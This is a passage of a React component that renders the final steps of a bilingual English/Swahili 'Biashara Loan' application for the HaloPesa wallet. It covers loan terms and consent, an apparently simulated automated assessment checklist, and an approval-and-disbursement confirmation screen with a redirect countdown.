                          <span className="text-stone-400 block text-[10px]">Amount / Kiasi:</span>
                          <span className="font-black text-[#F05A22] font-mono text-sm">
                            TZS {Number(amount).toLocaleString()}
                          </span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Tenure / Muda:</span>
                          <span className="font-bold text-stone-800">{durationMonths} Months</span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Total Due / Kulipa:</span>
                          <span className="font-bold text-stone-900 font-mono">
                            TZS {totalRepayment.toLocaleString()}
                          </span>
                        </div>
                        <div>
                          <span className="text-stone-400 block text-[10px]">Due Date / Tarehe:</span>
                          <span className="font-bold text-stone-800">{formattedDueDate}</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Terms & Conditions Checkbox */}
                  <div className="pt-2">
                    <label className="flex items-start gap-3 p-3.5 rounded-xl border border-stone-200 bg-white hover:bg-stone-50 cursor-pointer transition-colors">
                      <input
                        type="checkbox"
                        checked={agreedToTerms}
                        onChange={(e) => {
                          setAgreedToTerms(e.target.checked);
                          if (e.target.checked) setValidationError('');
                        }}
                        className="mt-0.5 h-4 w-4 rounded text-[#F05A22] focus:ring-[#F05A22] border-stone-300 accent-[#F05A22]"
                      />
                      <span className="text-xs text-stone-700 leading-snug">
                        I confirm all details are accurate and agree to Biashara Loan Terms & Conditions. I understand funds will be disbursed directly into my HaloPesa line.
                        <span className="block text-stone-400 text-[11px] italic mt-0.5">
                          / Nathibitisha taarifa nilizotoa ni sahihi na ninakubaliana na Masharti ya Mikopo ya Biashara.
                        </span>
                      </span>
                    </label>
                  </div>
                </div>

                {/* Navigation Buttons */}
                <div className="flex items-center justify-between pt-2">
                  <button
                    type="button"
                    onClick={() => setCurrentStep(3)}
                    className="px-5 py-3 rounded-xl font-bold text-stone-700 text-sm bg-stone-100 hover:bg-stone-200 transition-colors flex items-center gap-1.5 cursor-pointer"
                  >
                    <ArrowLeft className="w-4 h-4" />
                    <span>Back / Rudi</span>
                  </button>

                  <button
                    type="submit"
                    className="px-8 py-4 rounded-xl font-extrabold text-white text-sm sm:text-base bg-[#F05A22] hover:bg-[#D8450E] active:scale-[0.98] shadow-lg shadow-orange-500/25 flex items-center gap-2 transition-all cursor-pointer"
                  >
                    <ShieldCheck className="w-5 h-5" />
                    <span>Submit Application for Assessment / Tuma Maombi</span>
                  </button>
                </div>
              </form>
            )}

          </div>
        )}

        {/* ═══════════════════════════════════════════════════════════════════
            STATE 2: AUTOMATED ASSESSMENT PROGRESS
        ════════════════════════════════════════════════════════════════════ */}
        {submissionState === 'processing' && (
          <div className="p-8 sm:p-14 text-center flex flex-col items-center justify-center min-h-[480px]">
            <div className="relative mb-6">
              <div className="w-20 h-20 rounded-full bg-orange-100 flex items-center justify-center">
                <Loader2 className="w-10 h-10 text-[#F05A22] animate-spin" />
              </div>
            </div>

            <h2 className="text-xl sm:text-2xl font-extrabold text-stone-900 tracking-tight">
              Assessing Your Biashara Loan Application
              <span className="block text-base sm:text-lg font-bold text-[#F05A22] mt-1">
                / Inakagua Maombi Yako ya Mkopo
              </span>
            </h2>

            <p className="text-xs sm:text-sm text-stone-500 mt-2 max-w-md">
              Please wait while our automated scoring engine verifies your salary bracket and prepares your HaloPesa payout...
            </p>

            {/* Steps Progress Checklist */}
            <div className="w-full max-w-sm mt-8 space-y-3 text-left">
              <div className={`p-3.5 rounded-xl border flex items-center gap-3 transition-colors ${
                processingStep >= 1 ? 'bg-emerald-50 border-emerald-200 text-emerald-900' : 'bg-stone-50 border-stone-200 text-stone-400'
              }`}>
                {processingStep > 1 ? (
                  <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
                ) : (
                  <Loader2 className="w-5 h-5 text-emerald-600 animate-spin shrink-0" />
                )}
                <div className="text-xs font-bold leading-snug">
                  Verifying Identity & HaloPesa Line ({phone})
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border flex items-center gap-3 transition-colors ${
                processingStep >= 2 ? 'bg-emerald-50 border-emerald-200 text-emerald-900' : 'bg-stone-50 border-stone-200 text-stone-400'
              }`}>
                {processingStep > 2 ? (
                  <CheckCircle2 className="w-5 h-5 text-emerald-600 shrink-0" />
                ) : processingStep === 2 ? (
                  <Loader2 className="w-5 h-5 text-emerald-600 animate-spin shrink-0" />
                ) : (
                  <div className="w-5 h-5 rounded-full border border-stone-300 shrink-0"></div>
                )}
                <div className="text-xs font-bold leading-snug">
                  Salary Calibration: Approved for TZS {Number(amount).toLocaleString()}
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border flex items-center gap-3 transition-colors ${
                processingStep >= 3 ? 'bg-emerald-50 border-emerald-200 text-emerald-900' : 'bg-stone-50 border-stone-200 text-stone-400'
              }`}>
                {processingStep === 3 ? (
                  <Loader2 className="w-5 h-5 text-emerald-600 animate-spin shrink-0" />
                ) : (
                  <div className="w-5 h-5 rounded-full border border-stone-300 shrink-0"></div>
                )}
                <div className="text-xs font-bold leading-snug">
                  Disbursing Funds to HaloPesa Wallet...
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ═══════════════════════════════════════════════════════════════════
            STATE 3: APPROVED & DISBURSED CELEBRATION MODAL
        ════════════════════════════════════════════════════════════════════ */}
        {submissionState === 'approved' && approvedLoanData && (
          <div className="p-8 sm:p-12 text-center flex flex-col items-center justify-center">
            
            {/* Celebration Icon */}
            <div className="w-20 h-20 rounded-full bg-emerald-100 flex items-center justify-center mb-5 animate-bounce">
              <CheckCircle2 className="w-12 h-12 text-[#009A44]" />
            </div>

            <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-100 text-[#009A44] text-xs font-extrabold mb-3">
              <Sparkles className="w-3.5 h-3.5" />
              <span>Loan Approved & Disbursed / Mkopo Umeidhinishwa!</span>
            </div>

            <h2 className="text-2xl sm:text-3xl font-extrabold text-stone-900 tracking-tight">
              Congratulations / Hongera, {approvedLoanData.borrowerName}!
            </h2>

            <p className="text-sm text-stone-600 max-w-md mt-2">
              Your Biashara Loan of <strong className="text-stone-900 font-bold">TZS {approvedLoanData.amount.toLocaleString()}</strong> has been disbursed directly into your HaloPesa wallet <strong className="text-[#F05A22]">{approvedLoanData.phone}</strong>!
              <span className="block text-stone-500 italic text-xs mt-1">
                / Fedha zimeingizwa kwenye pochi yako ya HaloPesa tayari kukuza biashara yako.
              </span>
            </p>

            {/* Disbursement Details Card */}
            <div className="w-full max-w-md bg-stone-50 border border-stone-200 rounded-2xl p-5 my-6 text-left space-y-2.5 text-xs sm:text-sm">
              <div className="flex justify-between items-center text-stone-600">
                <span>Loan Reference / Namba ya Kumbukumbu:</span>
                <span className="font-mono font-black text-stone-900">{approvedLoanData.loanId}</span>
              </div>
              <div className="flex justify-between items-center text-stone-600">
                <span>Disbursed Amount / Kiasi Kilichotumwa:</span>
                <span className="font-bold text-[#009A44] font-mono">TZS {approvedLoanData.amount.toLocaleString()}</span>
              </div>
              <div className="flex justify-between items-center text-stone-600">
                <span>Salary Tier / Kiwango cha Mshahara:</span>
                <span className="font-bold text-stone-800">{approvedLoanData.monthlyRevenue}</span>
              </div>
              <div className="flex justify-between items-center text-stone-600">
                <span>Total Repayment / Jumla ya Kurudisha:</span>
                <span className="font-bold text-stone-900 font-mono">TZS {approvedLoanData.totalRepayment.toLocaleString()}</span>
              </div>
              <div className="flex justify-between items-center text-stone-600">
                <span>Due Date / Tarehe ya Marejesho:</span>
                <span className="font-bold text-[#F05A22]">{approvedLoanData.dueDate}</span>
              </div>
            </div>

            {/* Countdown Banner */}
            <div className="text-xs text-stone-500 mb-6 flex items-center gap-1.5">
              <span>Redirecting to your HaloPesa Dashboard in <strong>{redirectCountdown}</strong> seconds...</span>
            </div>

            {/* Manual Immediate Redirect Button */}
            <button
              type="button"
              onClick={handleCompleteRedirect}
              className="w-full max-w-md py-4 px-6 rounded-2xl font-extrabold text-white text-sm sm:text-base bg-[#F05A22] hover:bg-[#D8450E] active:scale-[0.99] shadow-lg shadow-orange-500/25 flex items-center justify-center gap-2 transition-all cursor-pointer"
            >
              <Wallet className="w-5 h-5" />
              <span>Go to HaloPesa Wallet Now / Nenda Kwenye Pochi ya HaloPesa</span>
              <ArrowRight className="w-5 h-5 stroke-[2.2]" />
            </button>
          </div>
        )}

      </div>
    </div>
  );
}
